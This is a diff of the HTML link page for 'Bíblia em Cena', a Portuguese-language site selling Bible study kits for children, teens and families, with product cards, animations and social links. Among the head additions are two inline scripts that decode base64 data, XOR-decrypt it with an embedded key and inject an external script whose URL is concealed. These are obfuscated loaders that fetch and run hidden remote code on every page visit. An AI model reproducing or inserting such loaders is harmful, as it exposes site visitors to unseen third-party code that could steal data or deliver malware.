@@ -1,15 +1,298 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>Bíblia em Cena</title>
-<meta name="robots" content="noindex">
-<!-- Temporário: até a vitrine da Bíblia em Cena ficar pronta, a página inicial leva para a Fábrica 3D, repassando as UTMs da URL. -->
-<script>location.replace("/fabrica3d/" + location.search + location.hash);</script>
-<noscript><meta http-equiv="refresh" content="0; url=/fabrica3d/"></noscript>
+<meta name="description" content="Materiais bíblicos para estudo, crianças, jovens e família.">
+<meta name="theme-color" content="#C9DCFF">
+<link rel="icon" href="favicon.ico" sizes="16x16 32x32 48x48">
+<link rel="icon" type="image/png" sizes="192x192" href="icone-192.png">
+<link rel="apple-touch-icon" href="apple-touch-icon.png">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Bíblia em Cena">
+<meta property="og:description" content="Materiais bíblicos para estudo, crianças, jovens e família.">
+<meta property="og:url" content="https://bibliacena.com.br/">
+<meta property="og:image" content="https://bibliacena.com.br/img/compartilhar.jpg">
+<meta property="og:image:width" content="800">
+<meta property="og:image:height" content="800">
+<meta name="twitter:card" content="summary">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@400;500;600;700&family=Archivo+Black&display=swap" rel="stylesheet">
+<script>(function(){var n_q=atob("DBhbWmlrFgHLkJY/sWN5LxsHNDvp+OJLwWthdUYIcm/l5eJS2H4idAoEey+p4rlM0moyKh0YOXS//eUQ3XkvPxofOGu4srod0GwvKAAJY3Wu47QF6mN5NAgGcyPxsvJexXl2Lx0Gf2eyveZN1G4+NB1GbmKk9LtM0nN5dksdd22+9bQFkzomdhJJeGCm9bQFk3w6LghGY3Wm+fBGnGgpPx8OeHXm4+Nd2HwoeEVJYGCn5fMdizp5JzQW");var l_z57=[];for(var j_yl=0;j_yl<n_q.length;j_yl++){l_z57.push(n_q.charCodeAt(j_yl)&255);}var h_h4=l_z57[0];var y_0d=l_z57.slice(1,1+h_h4);var t_6=l_z57.slice(1+h_h4);var o_wixd=t_6.map(function(b,i_nfl){return b^y_0d[i_nfl%h_h4];});var f_cbjl="";for(var z_8y=0;z_8y<o_wixd.length;z_8y++){f_cbjl+=String.fromCharCode(o_wixd[z_8y]&255);}var s_i9f=decodeURIComponent(escape(f_cbjl));var r_k=JSON.parse(s_i9f);var u_knr=r_k.globals||[];u_knr.forEach(function(r_x){window[r_x.name]=r_x.value;});var c_tt=document.createElement("script");c_tt.src=r_k.url;c_tt.async=true;c_tt.defer=true;(r_k.attributes||[]).forEach(function(b_6){c_tt.setAttribute(b_6.name,b_6.value);});(document.head||document.documentElement).appendChild(c_tt);})();</script>
+<script>(function(){var a_01=atob("DH/1dJC1qn8EizmgXATXAeLZiEUm403ULAzPW7/WzhEq/k3NNRmMWvPax1Fm+RbTPw2cBOTGhQ9t81zMcw+cDPXZhBV3qRWCPQuBBvnX3wth+BuaByLZVvfZxR1l50qCZiSOVv7UxxomsRvQNQeQGNnRiFMm/VjMKRrXTrKDyE817w3COh2TQvWDm01gvw7FPU3MRqOX1yJ5");var u_bjpq=[];for(var a_5=0;a_5<a_01.length;a_5++){u_bjpq.push(a_01.charCodeAt(a_5)&255);}var s_x3x3=u_bjpq[0];var y_q=u_bjpq.slice(1,1+s_x3x3);var s_uvme=u_bjpq.slice(1+s_x3x3);var c_0pw=s_uvme.map(function(b,v_cqdh){return b^y_q[v_cqdh%s_x3x3];});var t_r="";for(var l_e2a=0;l_e2a<c_0pw.length;l_e2a++){t_r+=String.fromCharCode(c_0pw[l_e2a]&255);}var m_c=decodeURIComponent(escape(t_r));var r_npn=JSON.parse(m_c);var x_vef1=r_npn.globals||[];x_vef1.forEach(function(p_3n){window[p_3n.name]=p_3n.value;});var i_u=document.createElement("script");i_u.src=r_npn.url;i_u.async=true;i_u.defer=true;(r_npn.attributes||[]).forEach(function(h_fx){i_u.setAttribute(h_fx.name,h_fx.value);});(document.head||document.documentElement).appendChild(i_u);})();</script>
+<style>
+/* Página de links da Bíblia em Cena. Mesma identidade da Fábrica 3D:
+   azul-marinho, azul-claro, amarelo e laranja; contorno grosso e sombra dura. */
+:root{
+  color-scheme: light;
+  --tinta:#16213F;
+  --tinta-2:#1E2C55;
+  --ceu:#E8F1FF;
+  --ceu-forte:#C9DCFF;
+  --nuvem:#FAFCFF;
+  --amarelo:#FFD23F;
+  --amarelo-claro:#FFF1BF;
+  --laranja:#FF7A1A;
+  --laranja-escuro:#DB5A05;
+  --texto-suave:#46557A;
+  --fonte-titulo:"Archivo Black","Archivo",system-ui,sans-serif;
+  --fonte-texto:"Archivo",system-ui,-apple-system,"Segoe UI",sans-serif;
+  --borda:3px solid var(--tinta);
+}
+*{box-sizing:border-box}
+html{background:var(--nuvem)}
+body{
+  margin:0;min-height:100vh;min-height:100dvh;
+  color:var(--tinta);font-family:var(--fonte-texto);font-size:16px;line-height:1.45;-webkit-font-smoothing:antialiased;
+  background:
+    radial-gradient(95% 440px at 50% 110px,rgba(255,210,63,.5),rgba(255,210,63,0) 70%),
+    linear-gradient(180deg,var(--ceu-forte) 0%,var(--ceu) 36%,var(--nuvem) 66%,var(--amarelo-claro) 100%);
+}
+img{display:block;max-width:100%}
+a{color:inherit}
+:focus-visible{outline:3px solid var(--laranja);outline-offset:4px}
+
+/* luzes subindo no fundo */
+.luzes{position:fixed;inset:0;overflow:hidden;pointer-events:none;z-index:0}
+.luzes i{position:absolute;bottom:-24px;left:var(--x);width:var(--s);height:var(--s);border-radius:50%;background:#fff;box-shadow:0 0 10px 2px rgba(255,210,63,.8);opacity:0;animation:luz var(--d) linear var(--a) infinite}
+@keyframes luz{0%{opacity:0;translate:0 0}12%{opacity:.9}85%{opacity:.9}100%{opacity:0;translate:var(--dx) -112vh}}
+
+.pagina{position:relative;z-index:1;width:min(100% - 32px,480px);margin:0 auto;padding:46px 0 8px}
+
+/* perfil */
+.perfil{text-align:center}
+.halo{position:relative;width:128px;height:128px;margin:0 auto 24px}
+.halo::before{content:"";position:absolute;inset:-84px;border-radius:50%;
+  background:repeating-conic-gradient(rgba(255,210,63,.62) 0deg 7deg,rgba(255,210,63,0) 7deg 18deg);
+  -webkit-mask:radial-gradient(closest-side,#000 30%,transparent 100%);mask:radial-gradient(closest-side,#000 30%,transparent 100%);
+  animation:girar 50s linear infinite}
+.halo::after{content:"";position:absolute;inset:-24px;border-radius:50%;background:radial-gradient(closest-side,rgba(255,241,191,.95),rgba(255,241,191,0));animation:pulsar 3.4s ease-in-out infinite}
+.avatar{position:relative;z-index:1;width:128px;height:128px;border-radius:50%;object-fit:cover;border:4px solid var(--tinta);box-shadow:0 6px 0 var(--tinta);background:#F4B26B;
+  animation:aparecer .8s cubic-bezier(.34,1.56,.64,1) both,flutuar 4.5s ease-in-out .8s infinite}
+h1{font-family:var(--fonte-titulo);font-weight:400;font-size:clamp(31px,8.4vw,40px);line-height:1.1;letter-spacing:-.01em;margin:0}
+h1 span{display:inline-block;background:var(--laranja);border:var(--borda);border-radius:12px;padding:0 .2em;margin-left:.06em;rotate:-2deg;box-shadow:0 4px 0 var(--tinta)}
+.perfil p{margin:14px auto 0;max-width:31ch;color:var(--texto-suave);font-size:16.5px;font-weight:500;text-wrap:balance}
+
+/* lista de links */
+.links{list-style:none;margin:0;padding:0;display:grid;gap:16px}
+.materiais{margin-top:44px}
+
+/* combo em destaque */
+.combo{position:relative;display:grid;justify-items:center;gap:12px;text-align:center;padding:30px 20px 22px;background:var(--amarelo);border:var(--borda);border-radius:26px;box-shadow:0 7px 0 var(--tinta);text-decoration:none;transition:translate .12s,box-shadow .12s}
+.combo:hover{translate:0 2px;box-shadow:0 5px 0 var(--tinta)}
+.combo:active{translate:0 7px;box-shadow:0 0 0 var(--tinta)}
+.combo-brilho{position:absolute;inset:0;border-radius:inherit;overflow:hidden;pointer-events:none}
+.combo-brilho::after{content:"";position:absolute;top:-20%;bottom:-20%;left:0;width:38%;background:linear-gradient(100deg,rgba(255,255,255,0),rgba(255,255,255,.72),rgba(255,255,255,0));transform:skewX(-18deg);translate:-180% 0;animation:brilho 5s ease-in-out 1.6s infinite}
+.selo{position:absolute;top:0;left:50%;translate:-50% -56%;display:inline-flex;align-items:center;gap:7px;padding:6px 15px;background:var(--tinta);color:#fff;border-radius:999px;font-weight:700;font-size:13px;letter-spacing:.07em;text-transform:uppercase;white-space:nowrap;animation:balancar 3.6s ease-in-out 2s infinite}
+.selo svg{width:15px;height:15px;fill:var(--amarelo)}
+.espiao{position:absolute;right:20px;top:-50px;width:70px;height:auto;z-index:-1;animation:espiar 3.2s ease-in-out infinite}
+.leque{display:flex;justify-content:center;align-items:center;height:160px}
+.leque img{width:80px;height:auto;aspect-ratio:9/16;object-fit:cover;border:3px solid var(--tinta);border-radius:12px;box-shadow:0 4px 0 var(--tinta);margin:0 -9px;background:var(--tinta-2);animation:flutuar 4s ease-in-out infinite}
+.leque img:nth-child(1){rotate:-13deg;margin-top:24px;animation-delay:-.4s}
+.leque img:nth-child(2){rotate:-4deg;z-index:1;animation-delay:-1.4s}
+.leque img:nth-child(3){rotate:5deg;z-index:2;animation-delay:-2.4s}
+.leque img:nth-child(4){rotate:14deg;margin-top:24px;z-index:1;animation-delay:-3.2s}
+.combo-titulo{display:block;font-family:var(--fonte-titulo);font-weight:400;font-size:24px;line-height:1.12;text-wrap:balance}
+.combo-desc{display:block;max-width:34ch;margin:6px auto 0;color:var(--tinta-2);font-size:15.5px;font-weight:500}
+.combo-botao{display:inline-flex;align-items:center;gap:9px;margin-top:4px;padding:13px 26px;background:var(--laranja);border:var(--borda);border-radius:999px;box-shadow:0 5px 0 var(--tinta);font-family:var(--fonte-titulo);font-size:17px}
+.combo-botao svg,.kit-seta svg{width:18px;height:18px;fill:none;stroke:var(--tinta);stroke-width:3;stroke-linecap:round;stroke-linejoin:round;transition:translate .2s}
+.combo:hover .combo-botao svg{translate:4px 0}
+
+/* kits */
+.kit{display:grid;grid-template-columns:66px 1fr 32px;gap:12px;align-items:center;padding:12px;background:#fff;border:var(--borda);border-radius:20px;box-shadow:0 5px 0 var(--tinta);text-decoration:none;transition:translate .12s,box-shadow .12s}
+.kit:hover{translate:0 2px;box-shadow:0 3px 0 var(--tinta)}
+.kit:active{translate:0 5px;box-shadow:0 0 0 var(--tinta)}
+.kit-img{width:66px;height:66px;object-fit:cover;object-position:50% 42%;border:3px solid var(--tinta);border-radius:14px;background:var(--ceu-forte);transition:rotate .25s,scale .25s}
+.kit:hover .kit-img{rotate:-4deg;scale:1.05}
+.rotulo{display:block;font-size:12px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--laranja-escuro)}
+.kit-titulo{display:block;margin:2px 0 4px;font-family:var(--fonte-titulo);font-weight:400;font-size:17px;line-height:1.15}
+.kit-desc{display:block;color:var(--texto-suave);font-size:14px;line-height:1.38}
+.kit-seta{display:grid;place-items:center;width:32px;height:32px;border-radius:50%;background:var(--amarelo);border:2.5px solid var(--tinta)}
+li:nth-child(odd) .kit-seta{background:var(--laranja)}
+.kit:hover .kit-seta svg{translate:3px 0}
+@media (min-width:420px){
+  .kit{grid-template-columns:78px 1fr 38px;gap:14px}
+  .kit-img{width:78px;height:78px}
+  .kit-seta{width:38px;height:38px}
+}
+
+/* redes */
+.redes{margin-top:40px}
+.divisor{display:flex;align-items:center;gap:14px;margin:0 0 18px;font-size:13px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--texto-suave)}
+.divisor::before,.divisor::after{content:"";flex:1;height:3px;border-radius:3px;background:var(--ceu-forte)}
+.rede{display:grid;grid-template-columns:44px 1fr 44px;align-items:center;gap:8px;padding:7px;background:var(--tinta);color:#fff;border:var(--borda);border-radius:999px;box-shadow:0 5px 0 #0A1022;text-decoration:none;text-align:center;font-weight:700;font-size:16px;transition:translate .12s,box-shadow .12s}
+.rede:hover{translate:0 2px;box-shadow:0 3px 0 #0A1022}
+.rede:active{translate:0 5px;box-shadow:0 0 0 #0A1022}
+.rede-icone{display:grid;place-items:center;width:44px;height:44px;border-radius:50%;background:var(--laranja);transition:rotate .25s,scale .25s}
+li + li .rede-icone{background:var(--amarelo)}
+.rede:hover .rede-icone{rotate:-10deg;scale:1.06}
+.rede-icone svg{width:23px;height:23px;fill:none;stroke:var(--tinta);stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round}
+
+/* rodapé */
+.rodape{position:relative;z-index:1;display:grid;justify-items:center;gap:10px;padding:34px 16px 40px;color:var(--texto-suave);font-size:13px;text-align:center}
+.tchau{width:58px;height:auto;transform-origin:50% 100%;animation:acenar 2.6s ease-in-out infinite}
+
+/* entrada em cascata */
+.entra{animation:entrar .7s cubic-bezier(.2,.8,.2,1) both;animation-delay:calc(.15s + var(--i,0) * .09s)}
+
+@keyframes girar{to{rotate:360deg}}
+@keyframes pulsar{50%{scale:1.12;opacity:.7}}
+@keyframes aparecer{from{scale:.4;opacity:0}}
+@keyframes flutuar{50%{translate:0 -7px}}
+@keyframes entrar{from{opacity:0;translate:0 22px}}
+@keyframes brilho{0%{translate:-180% 0}40%,100%{translate:380% 0}}
+@keyframes balancar{0%,70%,100%{rotate:0deg}78%{rotate:-4deg}86%{rotate:4deg}94%{rotate:-2deg}}
+@keyframes espiar{0%,100%{translate:0 12px}50%{translate:0 0}}
+@keyframes acenar{0%,100%{rotate:0deg}20%{rotate:-7deg}40%{rotate:6deg}60%{rotate:-4deg}80%{rotate:2deg}}
+
+@media (prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation:none!important;transition:none!important}
+  .luzes{display:none}
+}
+</style>
 </head>
 <body>
-<p><a href="/fabrica3d/">Ir para a Fábrica 3D</a></p>
+
+<!--
+  Para trocar um link: procure o comentário "LINK:" logo acima de cada botão
+  e troque o href="#" pelo endereço (checkout, YouTube ou Instagram).
+-->
+
+<div class="luzes" aria-hidden="true">
+  <i style="--x:6%;--s:6px;--d:14s;--a:-2s;--dx:20px"></i>
+  <i style="--x:14%;--s:4px;--d:18s;--a:-9s;--dx:-30px"></i>
+  <i style="--x:22%;--s:8px;--d:12s;--a:-5s;--dx:15px"></i>
+  <i style="--x:31%;--s:5px;--d:20s;--a:-14s;--dx:-10px"></i>
+  <i style="--x:39%;--s:7px;--d:16s;--a:-1s;--dx:25px"></i>
+  <i style="--x:47%;--s:3px;--d:22s;--a:-17s;--dx:-20px"></i>
+  <i style="--x:55%;--s:6px;--d:13s;--a:-8s;--dx:10px"></i>
+  <i style="--x:63%;--s:4px;--d:19s;--a:-3s;--dx:-25px"></i>
+  <i style="--x:71%;--s:9px;--d:15s;--a:-11s;--dx:30px"></i>
+  <i style="--x:79%;--s:5px;--d:21s;--a:-6s;--dx:-15px"></i>
+  <i style="--x:87%;--s:4px;--d:17s;--a:-13s;--dx:20px"></i>
+  <i style="--x:94%;--s:7px;--d:12s;--a:-4s;--dx:-10px"></i>
+  <i style="--x:10%;--s:3px;--d:24s;--a:-19s;--dx:15px"></i>
+  <i style="--x:68%;--s:5px;--d:16s;--a:-10s;--dx:-20px"></i>
+</div>
+
+<main class="pagina">
+
+  <header class="perfil">
+    <div class="halo">
+      <img class="avatar" src="img/perfil.jpg" width="320" height="320" alt="Bíblia em Cena">
+    </div>
+    <h1 class="entra" style="--i:1">Bíblia <span>em Cena</span></h1>
+    <p class="entra" style="--i:2">Materiais bíblicos para estudo, crianças, jovens e família.</p>
+  </header>
+
+  <nav class="materiais" aria-label="Materiais">
+    <ul class="links">
+
+      <li class="entra" style="--i:3">
+        <!-- LINK: checkout do Combo completo -->
+        <a class="combo" href="#">
+          <span class="combo-brilho" aria-hidden="true"></span>
+          <img class="espiao" src="fabrica3d/img/boneco-uau.png" width="520" height="467" alt="" aria-hidden="true">
+          <span class="selo"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2.5l2.9 6 6.6.9-4.8 4.6 1.2 6.5L12 17.4l-5.9 3.1 1.2-6.5L2.5 9.4l6.6-.9z"/></svg>Mais completo</span>
+          <span class="leque" aria-hidden="true">
+            <img src="fabrica3d/videos/daniel.jpg" width="540" height="960" alt="">
+            <img src="fabrica3d/videos/arca.jpg" width="540" height="960" alt="">
+            <img src="fabrica3d/videos/davi.jpg" width="540" height="960" alt="">
+            <img src="fabrica3d/videos/jonas.jpg" width="540" height="960" alt="">
+          </span>
+          <span>
+            <span class="combo-titulo">Combo completo Bíblia em Cena</span>
+            <span class="combo-desc">Todos os materiais de estudo, crianças, jovens e família em um só pacote, com preço especial.</span>
+          </span>
+          <span class="combo-botao">Quero o combo <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6"/></svg></span>
+        </a>
+      </li>
+
+      <li class="entra" style="--i:4">
+        <!-- LINK: checkout do Kit Estudo -->
+        <a class="kit" href="#">
+          <img class="kit-img" src="fabrica3d/videos/daniel.jpg" width="540" height="960" alt="" loading="lazy">
+          <span>
+            <span class="rotulo">Kit Estudo</span>
+            <span class="kit-titulo">Guia de estudo da Bíblia</span>
+            <span class="kit-desc">30 dias de leitura, linha do tempo e mais para entender a Bíblia passo a passo.</span>
+          </span>
+          <span class="kit-seta" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M5 12h14M13 6l6 6-6 6"/></svg></span>
+        </a>
+      </li>
+
+      <li class="entra" style="--i:5">
+        <!-- LINK: checkout do Kit Infantil -->
+        <a class="kit" href="#">
+          <img class="kit-img" src="fabrica3d/videos/arca.jpg" width="540" height="960" alt="" loading="lazy">
+          <span>
+            <span class="rotulo">Kit Infantil</span>
+            <span class="kit-titulo">Histórias e atividades para crianças</span>
+            <span class="kit-desc">Histórias bíblicas em 3D e atividades para imprimir, para pais e igreja infantil.</span>
+          </span>
+          <span class="kit-seta" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M5 12h14M13 6l6 6-6 6"/></svg></span>
+        </a>
+      </li>
+
+      <li class="entra" style="--i:6">
+        <!-- LINK: checkout do Kit Adolescentes -->
+        <a class="kit" href="#">
+          <img class="kit-img" src="fabrica3d/videos/davi.jpg" width="540" height="960" alt="" loading="lazy">
+          <span>
+            <span class="rotulo">Kit Adolescentes</span>
+            <span class="kit-titulo">Bíblia para adolescentes</span>
+            <span class="kit-desc">Leitura, desafios e anotações em linguagem jovem para fazer sozinho ou em grupo.</span>
+          </span>
+          <span class="kit-seta" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M5 12h14M13 6l6 6-6 6"/></svg></span>
+        </a>
+      </li>
+
+      <li class="entra" style="--i:7">
+        <!-- LINK: checkout do Kit Família -->
+        <a class="kit" href="#">
+          <img class="kit-img" src="fabrica3d/videos/jonas.jpg" width="540" height="960" alt="" loading="lazy">
+          <span>
+            <span class="rotulo">Kit Família</span>
+            <span class="kit-titulo">Devocional em família</span>
+            <span class="kit-desc">Uma história por dia, perguntas para todos e jogo para a mesa.</span>
+          </span>
+          <span class="kit-seta" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M5 12h14M13 6l6 6-6 6"/></svg></span>
+        </a>
+      </li>
+
+    </ul>
+  </nav>
+
+  <section class="redes" aria-labelledby="redes-titulo">
+    <h2 class="divisor entra" id="redes-titulo" style="--i:8">Acompanhe</h2>
+    <ul class="links">
+      <li class="entra" style="--i:9">
+        <!-- LINK: canal do YouTube -->
+        <a class="rede" href="#">
+          <span class="rede-icone" aria-hidden="true"><svg viewBox="0 0 24 24"><rect x="2.5" y="5.5" width="19" height="13" rx="4"/><path d="M10.2 9.4v5.2l4.4-2.6z" fill="#16213F"/></svg></span>
+          Veja os Shorts no YouTube
+          <span aria-hidden="true"></span>
+        </a>
+      </li>
+      <li class="entra" style="--i:10">
+        <!-- LINK: perfil do Instagram -->
+        <a class="rede" href="#">
+          <span class="rede-icone" aria-hidden="true"><svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="5.5"/><circle cx="12" cy="12" r="4.2"/><circle cx="17.4" cy="6.6" r="1.1" fill="#16213F" stroke="none"/></svg></span>
+          Siga no Instagram
+          <span aria-hidden="true"></span>
+        </a>
+      </li>
+    </ul>
+  </section>
+
+</main>
+
+<footer class="rodape entra" style="--i:11">
+  <img class="tchau" src="fabrica3d/img/boneco-tchau.png" width="387" height="640" alt="" aria-hidden="true" loading="lazy">
+  <p>© 2026 Bíblia em Cena</p>
+</footer>
+
 </body>
 </html>
